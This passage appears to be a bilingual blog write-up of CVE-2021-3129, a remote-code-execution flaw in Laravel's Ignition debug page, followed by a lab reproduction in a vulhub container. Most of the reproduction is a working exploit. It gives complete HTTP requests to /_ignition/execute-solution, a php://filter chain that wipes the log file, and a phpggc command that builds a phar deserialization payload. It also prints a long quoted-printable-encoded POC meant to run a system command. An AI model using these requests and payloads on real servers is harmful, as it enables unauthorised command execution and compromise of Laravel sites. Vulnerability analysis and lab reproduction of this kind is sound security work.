<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"><span class="comment">#it is running under default installation of Ubuntu 18.04 + PHP7.2 + Apache.</span></span><br><span class="line">($_=@$_GET[<span class="string">'orange'</span>]) &amp;&amp; @substr(file($_)[<span class="number">0</span>], <span class="number">0</span>, <span class="number">6</span>) ==<span class="string">'@&lt;?php'</span>? <span class="keyword">Include</span>($_): highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>The beginning of the session file generated by session.upload is <strong>upload_progress_</strong>, which does not meet the requirements of the title. But in PHP, <strong>base64 will automatically ignore illegal characters</strong>. Add the two characters “ZZ” in front of the uploaded file name, and the prefix is spliced with ZZ to become <strong>upload_progress_ZZ</strong>, this prefix will become illegal characters after decoding three times, causing the prefix to disappear completely. Based on this feature, you can bypass the restriction and match <strong>@&lt;?php</strong>.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203102.png" alt></p>
<p>The idea is also dragged back to this vulnerability. Originally, the format of the log file does not conform to the command execution format. Through the characteristics of encoding and decoding, the redundant characters are eliminated and the executable format is left to complete the deserialization.</p>
<p>Let’s look at the error response, the viewFile parameter value in the sent json data is written to the log.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203125.png" alt></p>
<p>Open the log file directly from the server, and all the green parts are the parts written into the log file.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203206.png" alt></p>
<p>The next step is to follow the idea of CTF topic, turn the log file into a phar file, and perform deserialization with the phar pseudo protocol. But there are still several issues that need to be addressed.</p>
<p>First of all, the base64 mentioned above will ignore illegal characters when decoding, but the “=” will not be ignored. If there is an equal sign in the base64-decoded string, it will cause an error to return a null value. The content we injected only occupies a small part of the log. It is difficult to test a suitable set of splicing characters, and make the extra characters disappear after a certain number of base64 decodings.</p>
<p>And there is another problem. The string representing time in front of the log is uncontrollable, and the content after decoding is uncontrollable.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php&gt; var_dump(base64_decode(base64_decode(<span class="string">'[2022-04-30 23:59:11]'</span>)));</span><br><span class="line">string(0) <span class="string">""</span></span><br><span class="line">php&gt; var_dump(base64_decode(base64_decode(<span class="string">'[2022-04-12 23:59:11]'</span>)));</span><br><span class="line">string(1) <span class="string">"2"</span></span><br></pre></td></tr></table></figure>

<p>In addition, the error log contains the absolute path, so you cannot use a same payload, you need to generate a new payload for each target.</p>
<p>Also, the payload we injected will appear twice in the log.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203236.png" alt></p>
<p>The final log format should be</p>
<blockquote>
<p>[prefix] <strong>payload</strong> [midfix] <strong>payload</strong> [suffix]</p>
</blockquote>
<p>Now that we have a general understanding of the format of the log recording mechanism, the next step is to solve these difficulties. First of all, the existence of illegal characters mentioned above will cause base64 decoding to skip. Using this mechanism, we can clear the log file.</p>
<p>Use utf-16 and utf-8 to convert between two encodings, resulting in an error and clearing the log file. And because there will be two payloads in the log, and UTF-16 reads two bytes, you can add a byte after the payload to swallow the payload that appears the second time. Note that there is a small detail here. When the payload is odd, the second payload will be decoded normally, and vice versa.</p>
<p>After the conversion back and forth, the characters except the payload are not legal characters for base64 decoding, and then using base64 decoding, only the payload is left.</p>
<p>But in this way, we are equivalent to expanding the one-byte utf-8 encoding to the two-byte utf-16 encoding, using null bytes to fill by default. But using null bytes in file_get_contents will give an error.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning: file_get_contents() expects parameter 1 to be a valid path, string given <span class="keyword">in</span> php shell code on line 1</span><br></pre></td></tr></table></figure>

<p>Fortunately, php provided us with a solution. Use the <strong>convert.quoted-printable-decode</strong> filter to encode the null character “\00” as “=00” into the log, and there is also a corresponding decoder <strong>convert.quoted-printable-decode</strong> Decode it.</p>
<p>The final encoding/transcoding chain is as follows.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=.. /storage/logs/laravel.log</span><br></pre></td></tr></table></figure>

<p>Finally sort out the attack chain</p>
<ol>
<li>Use the mutual conversion between UTF-8 and UTF-16 plus base64 decoding to clear the log.</li>
<li>Add a prefix AA to the payload in order to align two bits.</li>
<li>Write the payload to the log.</li>
<li>Repeat the first step to remove the non-payload part, leaving only the payload that complies with base64 encoding.</li>
<li>Use the Phar pseudo-protocol to trigger deserialization to implement command execution.</li>
</ol>
<h2 id="Code-Audit"><a href="#Code-Audit" class="headerlink" title="Code Audit"></a>Code Audit</h2><p><strong>vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\\<span class="title">Ignition</span>\\<span class="title">Http</span>\\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\\<span class="title">Ignition</span>\\<span class="title">Http</span>\\<span class="title">Requests</span>\\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\\<span class="title">IgnitionContracts</span>\\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\\<span class="title">Foundation</span>\\<span class="title">Validation</span>\\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest $request,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository $solutionProviderRepository</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>&#123;</span><br><span class="line">        $solution = $request-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        $solution-&gt;run($request-&gt;get(<span class="string">'parameters'</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">''</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The solution calls the run method and passes the parameters. This is the incoming point, and no filtering is done. Follow the run function of the solution method.</p>
<p><strong>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $output = <span class="keyword">$this</span>-&gt;makeOptional($parameters);</span><br><span class="line">        <span class="keyword">if</span> ($output !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            file_put_contents($parameters[<span class="string">'viewFile'</span>], $output);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span><span class="params">(array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $originalContents = file_get_contents($parameters[<span class="string">'viewFile'</span>]);</span><br><span class="line">        $newContents = str_replace(<span class="string">'$'</span>.$parameters[<span class="string">'variableName'</span>],<span class="string">'$'</span>.$parameters[<span class="string">'variableName'</span>].<span class="string">" ??''"</span>, $originalContents);</span><br><span class="line"></span><br><span class="line">        $originalTokens = token_get_all(Blade::compileString($originalContents));</span><br><span class="line">        $newTokens = token_get_all(Blade::compileString($newContents));</span><br><span class="line"></span><br><span class="line">        $expectedTokens = <span class="keyword">$this</span>-&gt;generateExpectedTokens($originalTokens, $parameters[<span class="string">'variableName'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($expectedTokens !== $newTokens) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $newContents;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>After the parameters are passed into the run function, they are not filtered, but are passed into the makeOptional function. After that, it was executed as a parameter of file_get_contents. The executed parameter was the viewFile parameter of the incoming json format data, which eventually led to the occurrence of deserialization vulnerability.</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>Finally, attach the exp of the Crisprss: <a href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP" target="_blank" rel="noopener">https://github.com/crisprss/Laravel_CVE-2021-3129_EXP</a></p>
<h1 id="CVE-2021-3129详解"><a href="#CVE-2021-3129详解" class="headerlink" title="CVE-2021-3129详解"></a>CVE-2021-3129详解</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>使用国内的daocloud一键安装docker。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL &lt;https://get.daocloud.io/docker&gt; | sh</span><br></pre></td></tr></table></figure>

<p>还要安装pip。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &lt;https://bootstrap.pypa.io/get-pip.py&gt; | python3</span><br></pre></td></tr></table></figure>

<p>完成安装pip之后,使用pip安装docker-compose。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>

<p>安装完成后使用下面的命令测试是否安装成功。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br><span class="line">docker-compose</span><br></pre></td></tr></table></figure>

<p>使用vluhub上面的文件,找到CVE-2021-3129，根据github上面的教程下载对应环境文件。按照vulhub上面的教程来就可以。</p>
<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>
<p>本次复现的是Laravel框架的漏洞，进入对应路径。首先查看README文档，默认设置的Laravel开放在8080端口。本人用的是阿里云的ECS搭建的，所以要去阿里云控制台上的安全策略中设置开放8080端口接受流量。</p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>复现的过程在README中有很详细的指示。根据复现过程，首先需要向ignition组件发送数据包。其实Ignition就是laravel自己的Debug页面，原生PHP的报错显然不能满足要求，所以Ignition其实就是Laravel自己的提供了一大堆功能的报错页面。其中的Solution就非常的好用，可以让开发者点点鼠标修复一些bug。具体功能不用关心，只需要知道本次的漏洞入口在这里。</p>
<p>因为本次漏洞环境是用docker搭建的，所以在服务器端最好进入docker容器对应的挂载目录，方便查看网站日志被操作的过程。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519214715.png" alt></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">找到需要进入目录的正在运行的容器的id</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="meta">#</span><span class="bash">进入该容器的目录：</span></span><br><span class="line">docker exec -it 容器id /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">可以查看一下当前路径</span></span><br><span class="line">pwd </span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>

<p>首先为了验证漏洞存在,发送如下数据包</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "xxxxxxx"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果返回了500并且出现了报错页面，从直接爆出的Debug页面中能看到这样的代码，证明漏洞存在。file_get_content作为php漏洞中经常见到的函数，这个函数支持php伪协议，会造成文件包含。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202630.png" alt></p>
<p>发送如下数据包，将日志文件清空。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回200表示清除成功。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202653.png" alt></p>
<p>使用phpggc生成序列化利用POC，没有安装phpggc的需要安装一下，phpggc是一款能够自动生成主流框架的序列化测试payload的工具。使用本条命令的时候要phpggc路径下。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "%s" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=6D=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=50=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=4B=00=43=00=64=00=33=00=61=00=47=00=39=00=68=00=62=00=57=00=6B=00=6E=00=4B=00=54=00=73=00=67=00=5A=00=58=00=68=00=70=00=64=00=44=00=73=00=67=00=50=00=7A=00=34=00=69=00=4F=00=33=00=31=00=39=00=66=00=51=00=55=00=41=00=41=00=41=00=42=00=6B=00=64=00=57=00=31=00=74=00=65=00=51=00=51=00=41=00=41=00=41=00=41=00=30=00=67=00=61=00=52=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=41=00=30=00=67=00=61=00=52=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=30=00=5A=00=58=00=4E=00=30=00=4B=00=43=00=63=00=56=00=36=00=44=00=48=00=36=00=4F=00=39=00=6F=00=37=00=61=00=7A=00=48=00=6C=00=43=00=42=00=46=00=64=00=71=00=61=00=39=00=46=00=78=00=7A=00=4D=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a</span><br></pre></td></tr></table></figure>

<p>接着发送如下数据包, 给log增加一个前缀<strong>AA</strong>来对齐。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 165</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "AA"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202818.png" alt></p>
<p>下一步就将payload写入log文件中。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5129</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "Payload above" &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202841.png" alt></p>
<p>写入payload之后清除其他字符，解码payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后触发反序列化，执行payload。</p>
